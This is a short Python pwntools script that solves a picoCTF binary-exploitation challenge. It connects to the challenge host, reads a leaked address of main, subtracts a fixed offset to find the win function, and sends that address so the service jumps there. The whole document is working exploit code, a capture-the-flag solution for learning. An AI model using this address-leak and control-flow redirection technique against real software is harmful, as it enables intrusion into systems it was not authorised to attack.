from pwn import *

HOST = "rescued-float.picoctf.net"
PORT = 56191

# local binary address
MAIN_TO_WIN_OFFSET = 0x000000000000133D - 0x00000000000012A7


def exploit():
    conn = remote(HOST, PORT)

    # get main function address
    response = conn.recvline().decode()
    main_addr = int(response.split(": ")[1], 16)
    log.info(f"main function address: {hex(main_addr)}")

    win_addr = main_addr - MAIN_TO_WIN_OFFSET

    log.info(f"win function address: {hex(win_addr)}")

    conn.recvuntil(b"Enter the address to jump to, ex => 0x12345: ")
    conn.sendline(hex(win_addr)[2:].encode())  # remove 0x prefix

    try:
        print(conn.recvall().decode())
    except Exception:
        print(conn.recv().decode())

    conn.close()


if __name__ == "__main__":
    exploit()
